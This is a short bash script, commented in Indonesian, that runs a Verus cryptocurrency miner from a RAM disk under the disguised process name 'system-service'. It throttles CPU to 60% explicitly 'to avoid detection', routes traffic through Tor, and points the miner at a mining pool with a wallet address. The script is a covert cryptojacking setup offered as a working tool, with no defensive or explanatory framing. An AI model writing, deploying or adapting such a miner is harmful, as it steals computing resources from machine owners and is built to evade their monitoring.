#!/bin/bash
# File: start-mining.sh
# Deskripsi: Mining Verus Coin di RAM disk dengan enkripsi

# Batasi CPU ke 60% untuk hindari deteksi
cpulimit -e system-service -l 60 &

# Gunakan Tor sebagai proxy
export ALL_PROXY=socks5h://127.0.0.1:9050

# Jalankan miner di RAM disk
cd /dev/shm/verus-mining
./system-service -a verushash -o stratum+ssl://ap.luckpool.net:3956 -u RU1DbwVyrMKaiLdMWapCYfhiC82FijAgbw.worker -p x -t $(($(nproc --all) - 1))
